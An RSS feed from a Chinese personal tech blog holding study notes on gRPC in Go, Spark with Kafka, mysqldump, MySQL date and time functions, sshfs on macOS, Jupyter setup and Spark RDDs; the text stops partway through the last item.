<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>泽民博客</title>
    <description>夏泽民的个人主页，学习笔记。</description>
    <link>https://xiazemin.github.io/MyBlog/</link>
    <atom:link href="https://xiazemin.github.io/MyBlog/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 25 Sep 2017 18:59:24 +0800</pubDate>
    <lastBuildDate>Mon, 25 Sep 2017 18:59:24 +0800</lastBuildDate>
    <generator>Jekyll v3.6.0.pre.beta1</generator>
    
      <item>
        <title>gorpc</title>
        <description>&lt;!-- more --&gt;
&lt;p&gt;gRPC初体验
96  作者 CZ_Golang 关注
2016.03.11 16:38 字数 1629 阅读 16506评论 2喜欢 29
gRPC是由Google主导开发的RPC框架，使用HTTP/2协议并用ProtoBuf作为序列化工具。其客户端提供Objective-C、Java接口，服务器侧则有Java、Golang、C++等接口，从而为移动端（iOS/Androi）到服务器端通讯提供了一种解决方案。 当然在当下的环境下，这种解决方案更热门的方式是RESTFull API接口。该方式需要自己去选择编码方式、服务器架构、自己搭建框架（JSON-RPC）。gRPC官方对REST的声音是：&lt;/p&gt;

&lt;p&gt;和REST一样遵循HTTP协议(明确的说是HTTP/2)，但是gRPC提供了全双工流
和传统的REST不同的是gRPC使用了静态路径，从而提高性能
用一些格式化的错误码代替了HTTP的状态码更好的标示错误
至于是否要选择用gRPC。对于已经有一套方案的团队，可以参考下。如果是从头来做，可以考虑下gRPC提供的从客户端到服务器的整套解决方案，这样不用客户端去实现http的请求会话，JSON等的解析，服务器端也有现成的框架用。从15年3月到现在gRPC也发展了一年了，慢慢趋于成熟。下面我们就以gRPC的Golang版本看下其在golang上面的表现。至于服务端的RPC，感觉golang标准库的RPC框架基本够用了,没必要再去用另一套方案。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;安装protobuf&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;虽然gRPC也支持protobuf2.x，但是建议还是使用protobuf3.x，尽管还没有正式版本，不过golang版本基本没有什么问题，另外3.x官方支持了Objective-C，这也是我们使用gRPC的初衷：提供一个移动端到服务器的解决方案。去到Protocol Buffers下载最新版本（Version3.0.0 beta2），然后解压到本地。本地需要已经安装好autoconf automake libtool.rpm系列（fedora/centos/redheat）可以用yum安装。Mac上可以用brew进行安装&lt;/p&gt;

&lt;p&gt;brew install autoconf automake libtool
然后执行&lt;/p&gt;

&lt;p&gt;./configure –prefix=your_pb_install_path
接着&lt;/p&gt;

&lt;p&gt;make 
make install
set your_pb_install_path to your $PATH
检查是否安装完成&lt;/p&gt;

&lt;p&gt;protoc –version
libprotoc 3.0.0
然后安装golang protobuf直接使用golang的get即可&lt;/p&gt;

&lt;p&gt;go get -u github.com/golang/protobuf/proto // golang protobuf 库
go get -u github.com/golang/protobuf/protoc-gen-go //protoc –go_out 工具&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;安装gRPC-go&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;gRPC-go可以通过golang 的get命令直接安装，非常方便。&lt;/p&gt;

&lt;p&gt;go get google.golang.org/grpc
这里大家可能比较奇怪，为什么gRPC-go在github的地址是”https://github.com/grpc/grpc-go”,但是为什么要用“google.golang.org/grpc”进行安装呢？应该grpc原本是google内部的项目，归属golang，就放在了google.golang.org下面了，后来对外开放，又将其迁移到github上面了，又因为golang比较坑爹的import路径规则，所以就都没有改路径名了。&lt;/p&gt;

&lt;p&gt;但是这样就有个问题了。要如何去管理版本呢？这个目前我还没有什么比较好的方法，希望知道的朋友一起分享下。目前想到一个方法是手动下载某个版本，然后写个脚本统一修改代码中的import里面的路径.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;示例程序&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;3.1 protobuf&lt;/p&gt;

&lt;p&gt;该示例源自gRPC-go的examples的helloworld。先看PB的描述：&lt;/p&gt;

&lt;p&gt;syntax = “proto3”;&lt;/p&gt;

&lt;p&gt;option objc_class_prefix = “HLW”;&lt;/p&gt;

&lt;p&gt;package helloworld;&lt;/p&gt;

&lt;p&gt;// The greeting service definition.
service Greeter {
  // Sends a greeting
  rpc SayHello (HelloRequest) returns (HelloReply) {}
}&lt;/p&gt;

&lt;p&gt;// The request message containing the user’s name.
message HelloRequest {
  string name = 1;
}&lt;/p&gt;

&lt;p&gt;// The response message containing the greetings
message HelloReply {
  string message = 1;
}
这里定义了一个服务Greeter，其中有个API SayHello。其接受参数为HelloRequest类型，返回HelloReply类型。这里HelloRequest和HelloReply就是普通的PB定义&lt;/p&gt;

&lt;p&gt;服务定义为：&lt;/p&gt;

&lt;p&gt;// The greeting service definition.
service Greeter {
  // Sends a greeting
  rpc SayHello (HelloRequest) returns (HelloReply) {}
}
service定义了一个server。其中的接口可以是四种类型&lt;/p&gt;

&lt;p&gt;rpc GetFeature(Point) returns (Feature) {}
类似普通的函数调用，客户端发送请求Point到服务器，服务器返回相应Feature.
rpc ListFeatures(Rectangle) returns (stream Feature) {}
客户端发起一次请求，服务器端返回一个流式数据，比如一个数组中的逐个元素
rpc RecordRoute(stream Point) returns (RouteSummary) {}
客户端发起的请求是一个流式的数据，比如数组中的逐个元素，服务器返回一个相应
rpc RouteChat(stream RouteNote) returns (stream RouteNote) {}
客户端发起的请求是一个流式数据，比如数组中的逐个元素，二服务器返回的也是一个类似的数据结构
后面三种可以参考官方的route_guide示例。&lt;/p&gt;

&lt;p&gt;使用protoc命令生成相关文件：&lt;/p&gt;

&lt;p&gt;protoc –go_out=plugins=grpc:. helloworld.proto
ls
helloworld.pb.go    helloworld.proto
生成对应的pb.go文件。这里用了plugins选项，提供对grpc的支持，否则不会生成Service的接口。&lt;/p&gt;

&lt;p&gt;3.2 服务器端程序&lt;/p&gt;

&lt;p&gt;然后编辑服务器端程序：&lt;/p&gt;

&lt;p&gt;package main&lt;/p&gt;

&lt;p&gt;import (
    “log”
    “net”&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pb &quot;your_path_to_gen_pb_dir/helloworld&quot;
&quot;golang.org/x/net/context&quot;
&quot;google.golang.org/grpc&quot; )
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;const (
    port = “:50051”
)&lt;/p&gt;

&lt;p&gt;// server is used to implement helloworld.GreeterServer.
type server struct{}&lt;/p&gt;

&lt;p&gt;// SayHello implements helloworld.GreeterServer
func (s &lt;em&gt;server) SayHello(ctx context.Context, in *pb.HelloRequest) (&lt;/em&gt;pb.HelloReply, error) {
    return &amp;amp;pb.HelloReply{Message: “Hello “ + in.Name}, nil
}&lt;/p&gt;

&lt;p&gt;func main() {
    lis, err := net.Listen(“tcp”, port)
    if err != nil {
        log.Fatalf(“failed to listen: %v”, err)
    }
    s := grpc.NewServer()
    pb.RegisterGreeterServer(s, &amp;amp;server{})
    s.Serve(lis)
}
这里首先定义一个server结构，然后实现SayHello的接口，其定义在“your_path_to_gen_pb_dir/helloworld”&lt;/p&gt;

&lt;p&gt;SayHello(context.Context, &lt;em&gt;HelloRequest) (&lt;/em&gt;HelloReply, error)
然后调用grpc.NewServer() 创建一个server s。接着注册这个server s到结构server上面 pb.RegisterGreeterServer(s, &amp;amp;server{}) 最后将创建的net.Listener传给s.Serve()。就可以开始监听并服务了，类似HTTP的ListenAndServe。&lt;/p&gt;

&lt;p&gt;3.3 客户端程序&lt;/p&gt;

&lt;p&gt;客户端程序：&lt;/p&gt;

&lt;p&gt;package main&lt;/p&gt;

&lt;p&gt;import (
    “log”
    “os”&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pb &quot;your_path_to_gen_pb_dir/helloworld&quot;
&quot;golang.org/x/net/context&quot;
&quot;google.golang.org/grpc&quot; )
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;const (
    address     = “localhost:50051”
    defaultName = “world”
)&lt;/p&gt;

&lt;p&gt;func main() {
    // Set up a connection to the server.
    conn, err := grpc.Dial(address, grpc.WithInsecure())
    if err != nil {
        log.Fatalf(“did not connect: %v”, err)
    }
    defer conn.Close()
    c := pb.NewGreeterClient(conn)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;// Contact the server and print out its response.
name := defaultName
if len(os.Args) &amp;gt; 1 {
    name = os.Args[1]
}
r, err := c.SayHello(context.Background(), &amp;amp;pb.HelloRequest{Name: name})
if err != nil {
    log.Fatalf(&quot;could not greet: %v&quot;, err)
}
log.Printf(&quot;Greeting: %s&quot;, r.Message) } 这里通过pb.NewGreeterClient()传入一个conn创建一个client，然后直接调用client上面对应的服务器的接口
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;SayHello(context.Context, &lt;em&gt;HelloRequest) (&lt;/em&gt;HelloReply, error)
接口，返回*HelloReply 对象。&lt;/p&gt;

&lt;p&gt;先运行服务器，在运行客户端，可以看到。&lt;/p&gt;

&lt;p&gt;./greeter_server &amp;amp;&lt;/p&gt;

&lt;p&gt;./greeter_client
2016/03/10 21:42:19 Greeting: Hello world&lt;/p&gt;
</description>
        <pubDate>Mon, 25 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/jekyll/2017/09/25/gorpc.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/jekyll/2017/09/25/gorpc.html</guid>
        
        
        <category>jekyll</category>
        
      </item>
    
      <item>
        <title>spark-kafka</title>
        <description>&lt;!-- more --&gt;
&lt;p&gt;参考文档：
https://spark.apache.org/docs/latest/structured-streaming-kafka-integration.html&lt;/p&gt;

&lt;p&gt;Reading Data from Kafka
Creating a Kafka Source for Streaming Queries
Scala
Java
Python
// Subscribe to 1 topic
val df = spark
  .readStream
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .option(“subscribe”, “topic1”)
  .load()
df.selectExpr(“CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .as[(String, String)]&lt;/p&gt;

&lt;p&gt;// Subscribe to multiple topics
val df = spark
  .readStream
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .option(“subscribe”, “topic1,topic2”)
  .load()
df.selectExpr(“CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .as[(String, String)]&lt;/p&gt;

&lt;p&gt;// Subscribe to a pattern
val df = spark
  .readStream
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .option(“subscribePattern”, “topic.*”)
  .load()
df.selectExpr(“CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .as[(String, String)]&lt;/p&gt;

&lt;p&gt;Writing Data to Kafka&lt;/p&gt;

&lt;p&gt;Creating a Kafka Sink for Streaming Queries
Scala
Java
Python
// Write key-value data from a DataFrame to a specific Kafka topic specified in an option
val ds = df
  .selectExpr(“CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .writeStream
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .option(“topic”, “topic1”)
  .start()&lt;/p&gt;

&lt;p&gt;// Write key-value data from a DataFrame to Kafka using a topic specified in the data
val ds = df
  .selectExpr(“topic”, “CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .writeStream
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .start()
Writing the output of Batch Queries to Kafka
Scala
Java
Python
// Write key-value data from a DataFrame to a specific Kafka topic specified in an option
df.selectExpr(“CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .write
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .option(“topic”, “topic1”)
  .save()&lt;/p&gt;

&lt;p&gt;// Write key-value data from a DataFrame to Kafka using a topic specified in the data
df.selectExpr(“topic”, “CAST(key AS STRING)”, “CAST(value AS STRING)”)
  .write
  .format(“kafka”)
  .option(“kafka.bootstrap.servers”, “host1:port1,host2:port2”)
  .save()&lt;/p&gt;
</description>
        <pubDate>Fri, 22 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/spark/2017/09/22/spark-kafka.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/spark/2017/09/22/spark-kafka.html</guid>
        
        
        <category>spark</category>
        
      </item>
    
      <item>
        <title>mysqldump</title>
        <description>&lt;!-- more --&gt;
&lt;p&gt;mysqldump  -P端口  -hIP -u用户名 -p密码 表名 库名 &amp;gt; 目标文件.sql&lt;/p&gt;

&lt;p&gt;mysqldump: [Warning] Using a password on the command line interface can be insecure.&lt;/p&gt;

&lt;p&gt;mysqldump  -P端口  -hIP -u用户名 -p 表名 库名 &amp;gt; 目标文件.sql&lt;/p&gt;

&lt;p&gt;然后输入密码&lt;/p&gt;
</description>
        <pubDate>Wed, 20 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/web/2017/09/20/mysqldump.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/web/2017/09/20/mysqldump.html</guid>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>mysql-time</title>
        <description>&lt;!-- more --&gt;
&lt;p&gt;MySQL 获得当前日期时间 函数
获得当前日期+时间（date + time）函数：now()&lt;/p&gt;

&lt;p&gt;复制代码
mysql&amp;gt; select now();&lt;/p&gt;

&lt;p&gt;+———————+
| now() |
+———————+
| 2008-08-08 22:20:46 |
+———————+
复制代码
获得当前日期+时间（date + time）函数：sysdate()
sysdate() 日期时间函数跟 now() 类似，不同之处在于：now() 在执行开始时值就得到了， sysdate() 在函数执行时动态得到值。看下面的例子就明白了：&lt;/p&gt;

&lt;p&gt;复制代码
mysql&amp;gt; select now(), sleep(3), now();&lt;/p&gt;

&lt;p&gt;+———————+———-+———————+
| now() | sleep(3) | now() |
+———————+———-+———————+
| 2008-08-08 22:28:21 | 0 | 2008-08-08 22:28:21 |
+———————+———-+———————+
复制代码
sysdate() 日期时间函数，一般情况下很少用到。&lt;/p&gt;

&lt;p&gt;MySQL 获得当前时间戳函数：current_timestamp, current_timestamp()&lt;/p&gt;

&lt;p&gt;复制代码
mysql&amp;gt; select current_timestamp, current_timestamp();&lt;/p&gt;

&lt;p&gt;+———————+———————+
| current_timestamp | current_timestamp() |
+———————+———————+
| 2008-08-09 23:22:24 | 2008-08-09 23:22:24 |
+———————+———————+
复制代码&lt;/p&gt;

&lt;p&gt;MySQL 日期转换函数、时间转换函数
MySQL Date/Time to Str（日期/时间转换为字符串）函数：date_format(date,format), time_format(time,format)&lt;/p&gt;

&lt;p&gt;复制代码
mysql&amp;gt; select date_format(‘2008-08-08 22:23:01’, ‘%Y%m%d%H%i%s’);&lt;/p&gt;

&lt;p&gt;+—————————————————-+
| date_format(‘2008-08-08 22:23:01’, ‘%Y%m%d%H%i%s’) |
+—————————————————-+
| 20080808222301 |
+—————————————————-+
复制代码
MySQL 日期、时间转换函数：date_format(date,format), time_format(time,format) 能够把一个日期/时间转换成各种各样的字符串格式。它是 str_to_date(str,format) 函数的 一个逆转换。&lt;/p&gt;

&lt;p&gt;MySQL Str to Date （字符串转换为日期）函数：str_to_date(str, format)&lt;/p&gt;

&lt;p&gt;select str_to_date(‘08/09/2008’, ‘%m/%d/%Y’); – 2008-08-09
select str_to_date(‘08/09/08’ , ‘%m/%d/%y’); – 2008-08-09
select str_to_date(‘08.09.2008’, ‘%m.%d.%Y’); – 2008-08-09
select str_to_date(‘08:09:30’, ‘%h:%i:%s’); – 08:09:30
select str_to_date(‘08.09.2008 08:09:30’, ‘%m.%d.%Y %h:%i:%s’); – 2008-08-09 08:09:30
可以看到，str_to_date(str,format) 转换函数，可以把一些杂乱无章的字符串转换为日期格式。另外，它也可以转换为时间。“format” 可以参看 MySQL 手册。&lt;/p&gt;

&lt;p&gt;MySQL （日期、天数）转换函数：to_days(date), from_days(days)&lt;/p&gt;

&lt;p&gt;select to_days(‘0000-00-00’); – 0
select to_days(‘2008-08-08’); – 733627&lt;/p&gt;

&lt;p&gt;MySQL （时间、秒）转换函数：time_to_sec(time), sec_to_time(seconds)&lt;/p&gt;

&lt;p&gt;select time_to_sec(‘01:00:05’); – 3605
select sec_to_time(3605); – ‘01:00:05’&lt;/p&gt;

&lt;p&gt;MySQL 拼凑日期、时间函数：makdedate(year,dayofyear), maketime(hour,minute,second)&lt;/p&gt;

&lt;p&gt;select makedate(2001,31); – ‘2001-01-31’
select makedate(2001,32); – ‘2001-02-01’
select maketime(12,15,30); – ‘12:15:30’&lt;/p&gt;

&lt;p&gt;MySQL （Unix 时间戳、日期）转换函数&lt;/p&gt;

&lt;p&gt;unix_timestamp(),
unix_timestamp(date),
from_unixtime(unix_timestamp),
from_unixtime(unix_timestamp,format)&lt;/p&gt;

&lt;p&gt;下面是示例：&lt;/p&gt;

&lt;p&gt;复制代码
select unix_timestamp(); – 1218290027
select unix_timestamp(‘2008-08-08’); – 1218124800
select unix_timestamp(‘2008-08-08 12:30:00’); – 1218169800&lt;/p&gt;

&lt;p&gt;select from_unixtime(1218290027); – ‘2008-08-09 21:53:47’
select from_unixtime(1218124800); – ‘2008-08-08 00:00:00’
select from_unixtime(1218169800); – ‘2008-08-08 12:30:00’&lt;/p&gt;

&lt;p&gt;select from_unixtime(1218169800, ‘%Y %D %M %h:%i:%s %x’); – ‘2008 8th August 12:30:00 2008’
复制代码&lt;/p&gt;

&lt;p&gt;MySQL 日期时间计算函数&lt;/p&gt;

&lt;p&gt;MySQL 为日期增加一个时间间隔：date_add()&lt;/p&gt;

&lt;p&gt;复制代码
set @dt = now();&lt;/p&gt;

&lt;p&gt;select date_add(@dt, interval 1 day); – add 1 day
select date_add(@dt, interval 1 hour); – add 1 hour
select date_add(@dt, interval 1 minute); – …
select date_add(@dt, interval 1 second);
select date_add(@dt, interval 1 microsecond);
select date_add(@dt, interval 1 week);
select date_add(@dt, interval 1 month);
select date_add(@dt, interval 1 quarter);
select date_add(@dt, interval 1 year);&lt;/p&gt;

&lt;p&gt;select date_add(@dt, interval -1 day); – sub 1 day
复制代码&lt;/p&gt;

&lt;p&gt;MySQL adddate(), addtime()函数，可以用 date_add() 来替代。下面是 date_add() 实现 addtime() 功能示例：&lt;/p&gt;

&lt;p&gt;复制代码
mysql&amp;gt; set @dt = ‘2008-08-09 12:12:33’;&lt;/p&gt;

&lt;p&gt;mysql&amp;gt;
mysql&amp;gt; select date_add(@dt, interval ‘01:15:30’ hour_second);&lt;/p&gt;

&lt;p&gt;+————————————————+
| date_add(@dt, interval ‘01:15:30’ hour_second) |
+————————————————+
| 2008-08-09 13:28:03 |
+————————————————+&lt;/p&gt;

&lt;p&gt;mysql&amp;gt; select date_add(@dt, interval ‘1 01:15:30’ day_second);&lt;/p&gt;

&lt;p&gt;+————————————————-+
| date_add(@dt, interval ‘1 01:15:30’ day_second) |
+————————————————-+
| 2008-08-10 13:28:03 |
+————————————————-+
复制代码&lt;/p&gt;

&lt;p&gt;MySQL 为日期减去一个时间间隔：date_sub()&lt;/p&gt;

&lt;p&gt;复制代码
mysql&amp;gt; select date_sub(‘1998-01-01 00:00:00’, interval ‘1 1:1:1’ day_second);&lt;/p&gt;

&lt;p&gt;+—————————————————————-+
| date_sub(‘1998-01-01 00:00:00’, interval ‘1 1:1:1’ day_second) |
+—————————————————————-+
| 1997-12-30 22:58:59 |
+—————————————————————-+
复制代码
MySQL date_sub() 日期时间函数 和 date_add() 用法一致，不再赘述。&lt;/p&gt;

&lt;p&gt;MySQL 日期、时间相减函数：datediff(date1,date2), timediff(time1,time2)&lt;/p&gt;

&lt;p&gt;MySQL datediff(date1,date2)：两个日期相减 date1 - date2，返回天数。
select datediff(‘2008-08-08’, ‘2008-08-01’); – 7
select datediff(‘2008-08-01’, ‘2008-08-08’); – -7
MySQL timediff(time1,time2)：两个日期相减 time1 - time2，返回 time 差值。&lt;/p&gt;

&lt;p&gt;select timediff(‘2008-08-08 08:08:08’, ‘2008-08-08 00:00:00’); – 08:08:08
select timediff(‘08:08:08’, ‘00:00:00’); – 08:08:08
注意：timediff(time1,time2) 函数的两个参数类型必须相同。&lt;/p&gt;

&lt;p&gt;MySQL 时间戳（timestamp）转换、增、减函数：&lt;/p&gt;

&lt;p&gt;timestamp(date) – date to timestamp
timestamp(dt,time) – dt + time
timestampadd(unit,interval,datetime_expr) –
timestampdiff(unit,datetime_expr1,datetime_expr2) –
请看示例部分：&lt;/p&gt;

&lt;p&gt;复制代码
select timestamp(‘2008-08-08’); – 2008-08-08 00:00:00
select timestamp(‘2008-08-08 08:00:00’, ‘01:01:01’); – 2008-08-08 09:01:01
select timestamp(‘2008-08-08 08:00:00’, ‘10 01:01:01’); – 2008-08-18 09:01:01&lt;/p&gt;

&lt;p&gt;select timestampadd(day, 1, ‘2008-08-08 08:00:00’); – 2008-08-09 08:00:00
select date_add(‘2008-08-08 08:00:00’, interval 1 day); – 2008-08-09 08:00:00&lt;/p&gt;

&lt;p&gt;MySQL timestampadd() 函数类似于 date_add()。
select timestampdiff(year,’2002-05-01’,’2001-01-01’); – -1
select timestampdiff(day ,’2002-05-01’,’2001-01-01’); – -485
select timestampdiff(hour,’2008-08-08 12:00:00’,’2008-08-08 00:00:00’); – -12&lt;/p&gt;

&lt;p&gt;select datediff(‘2008-08-08 12:00:00’, ‘2008-08-01 00:00:00’); – 7
复制代码
MySQL timestampdiff() 函数就比 datediff() 功能强多了，datediff() 只能计算两个日期（date）之间相差的天数。&lt;/p&gt;

&lt;p&gt;MySQL 时区（timezone）转换函数
convert_tz(dt,from_tz,to_tz)&lt;/p&gt;

&lt;p&gt;select convert_tz(‘2008-08-08 12:00:00’, ‘+08:00’, ‘+00:00’); – 2008-08-08 04:00:00
时区转换也可以通过 date_add, date_sub, timestampadd 来实现。&lt;/p&gt;

&lt;p&gt;select date_add(‘2008-08-08 12:00:00’, interval -8 hour); – 2008-08-08 04:00:00
select date_sub(‘2008-08-08 12:00:00’, interval 8 hour); – 2008-08-08 04:00:00
select timestampadd(hour, -8, ‘2008-08-08 12:00:00’); – 2008-08-08 04:00:00&lt;/p&gt;

</description>
        <pubDate>Wed, 20 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/jekyll/2017/09/20/mysql-time.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/jekyll/2017/09/20/mysql-time.html</guid>
        
        
        <category>jekyll</category>
        
      </item>
    
      <item>
        <title>mac 安装 sshfs</title>
        <description>
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;lineno&quot;&gt;1 &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$brew&lt;/span&gt; cask install osxfuse
&lt;span class=&quot;lineno&quot;&gt;2 &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$brew&lt;/span&gt; install sshfs&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;!-- more --&gt;
&lt;p&gt;挂载(如果配上ssh key就可以完全自动化了):
sshfs root@192.168.9.109:/opt /opt/s109
卸载:
fusermount -u /opt/s109&lt;/p&gt;
</description>
        <pubDate>Mon, 18 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/jekyll/2017/09/18/sshfs.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/jekyll/2017/09/18/sshfs.html</guid>
        
        
        <category>jekyll</category>
        
      </item>
    
      <item>
        <title>jupyter</title>
        <description>&lt;p&gt;Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。
Jupyter Notebook 的本质是一个 Web 应用程序，便于创建和共享文学化程序文档，支持实时代码，数学方程，可视化和 markdown。 用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等
&lt;!-- more --&gt;&lt;/p&gt;

&lt;p&gt;官网：https://github.com/jupyter?language=python&lt;/p&gt;

&lt;p&gt;mac 安装：
pip install jupyter&lt;/p&gt;

&lt;p&gt;使用：
$jupyter notebook&lt;/p&gt;

&lt;p&gt;此时浏览器中会弹出notebook窗口（http://localhost:8888/tree）&lt;/p&gt;

&lt;p&gt;问题：
出现404&lt;/p&gt;

&lt;p&gt;修改配置文件端口&lt;/p&gt;

&lt;p&gt;$jupyter  notebook –generate-config –allow-root&lt;/p&gt;

&lt;p&gt;/Users/didi/.jupyter/jupyter_notebook_config.py&lt;/p&gt;

&lt;p&gt;$vi /Users/didi/.jupyter/jupyter_notebook_config.py&lt;/p&gt;

&lt;p&gt;把端口改为8866&lt;/p&gt;

&lt;p&gt;0 active kernels&lt;/p&gt;

&lt;p&gt;The Jupyter Notebook is running at: http://localhost:8866/?token=2d6&lt;/p&gt;

&lt;p&gt;成功
&lt;img src=&quot;https://xiazemin.github.io/MyBlog/img/jupyter.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Files下面列出了当前用户目录下所有的文件，结合右上角的upload和new你可以方便地进行文件操作。你先选择一个目录，在该目录下，new一个python2，这样当前目录即会出现一个“.ipynb”文件，同时，浏览器会弹新的标签页让你编辑该“.ipynb”文件。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://xiazemin.github.io/MyBlog/img/jupyter_use.png&quot; alt=&quot;jupyter_use&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在该界面下，每输入一行代码Enter后不会运行当前代码，而是换行让你输入下一行代码，当你键入Shift + Enter后，将运行刚刚你输入的那几行代码。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://xiazemin.github.io/MyBlog/img/jupyter_use1.png&quot; alt=&quot;jupyter_use&quot; /&gt;&lt;/p&gt;

&lt;p&gt;还可以new一个Terminal，如下图所示。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://xiazemin.github.io/MyBlog/img/jupyter_use2.png&quot; alt=&quot;jupyter_use&quot; /&gt;&lt;/p&gt;

&lt;p&gt;mac 截图：
下载snipmac&lt;/p&gt;

</description>
        <pubDate>Sun, 17 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/deep_learning/2017/09/17/jupyter.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/deep_learning/2017/09/17/jupyter.html</guid>
        
        
        <category>deep_learning</category>
        
      </item>
    
      <item>
        <title>deep_learning</title>
        <description>&lt;p&gt;学习资源：
http://study.163.com/course/courseMain.htm?courseId=1003284016&lt;/p&gt;

&lt;p&gt;http://study.163.com/my#/smarts&lt;/p&gt;

&lt;!-- more --&gt;
</description>
        <pubDate>Sun, 17 Sep 2017 00:00:00 +0800</pubDate>
        <link>https://xiazemin.github.io/MyBlog/deep_learning/2017/09/17/deep_learning.html</link>
        <guid isPermaLink="true">https://xiazemin.github.io/MyBlog/deep_learning/2017/09/17/deep_learning.html</guid>
        
        
        <category>deep_learning</category>
        
      </item>
    
      <item>
        <title>spark-rdd</title>
        <description>&lt;!-- more --&gt;
&lt;p&gt;参考书籍
https://aiyanbo.gitbooks.io/spark-programming-guide-zh-cn/content/index.html
每个 Spark 应用程序都由一个驱动程序(driver programe)构成，驱动程序在集群上运行用户的 main 函数来执行各种各样的并行操作(parallel operations)。Spark 的主要抽象是提供一个弹性分布式数据集(RDD resilient distributed dataset)，RDD 是指能横跨集群所有节点进行并行计算的分区元素集合。RDD 可以从 Hadoop 文件系统中的一个文件中创建而来(或其他 Hadoop 支持的文件系统)，或者从一个已有的 Scala 集合转换得到。用户可以要求 Spark 将 RDD 持久化(persist)到内存中，来让它在并行计算中高效地重用。最后，RDD 能从节点失败中自动地恢复过来。
Spark 的第二个抽象是共享变量(shared variables)，共享变量能被运行在并行计算中。默认情况下，当 Spark 运行一个并行函数时，这个并行函数会作为一个任务集在不同的节点上运行，它会把函数里使用的每个变量都复制搬运到每个任务中。有时，一个变量需要被共享到交叉任务中或驱动程序和任务之间。Spark 支持 2 种类型的共享变量：广播变量(broadcast variables)，用来在所有节点的内存中缓存一个值；累加器(accumulators)，仅仅只能执行“添加(added)”操作，例如：记数器(counters)和求和(sums)。&lt;/p&gt;

&lt;p&gt;Spark 核心的概念是 Resilient Distributed Dataset (RDD)：一个可并行操作的有容错机制的数据集合。有 2 种方式创建 RDDs：第一种是在你的驱动程序中并行化一个已经存在的集合；另外一种是引用一个外部存储系统的数据集，例如共享的文件系统，HDFS，HBase或其他 Hadoop 数据格式的数据源。&lt;/p&gt;

&lt;p&gt;RDDs 支持 2 种类型的操作：转换(transformations) 从已经存在的数据集中创建一个新的数据集；动作(actions) 在数据集上进行计算之后返回一个值到驱动程序。例如，map 是一个转换操作，它将每一个数据集元素传递给一个函数并且返回一个新的 RDD。另一方面，reduce 是一个动作，它使用相同的函数来聚合 RDD 的所有元素，并且将最终的结果返回到驱动程序(不过也有一个并行 reduceByKey 能返回一个分布式数据集)。
在 Spark 中，所有的转换(transformations)都是惰性(lazy)的，它们不会马上计算它们的结果。相反的，它们仅仅记录转换操作是应用到哪些基础数据集(例如一个文件)上的。转换仅仅在这个时候计算：当动作(action) 需要一个结果返回给驱动程序的时候。这个设计能够让 Spark 运行得更加高效。例如，我们可以实现：通过 map 创建一个新数据集在 reduce 中使用，并且仅仅返回 reduce 的结果给 driver，而不是整个大的映射过的数据集。
默认情况下，每一个转换过的 RDD 会在每次执行动作(action)的时候重新计算一次。然而，你也可以使用 persist (或 cache)方法持久化(persist)一个 RDD 到内存中。在这个情况下，Spark 会在集群上保存相关的元素，在你下次查询的时候会变得更快。在这里也同样支持持久化 RDD 到磁盘，或在多个节点间复制。&lt;/p&gt;
</description>
        <pubDate>Fri, 15 Sep 2017 00:00:00 +0800</pubDate>
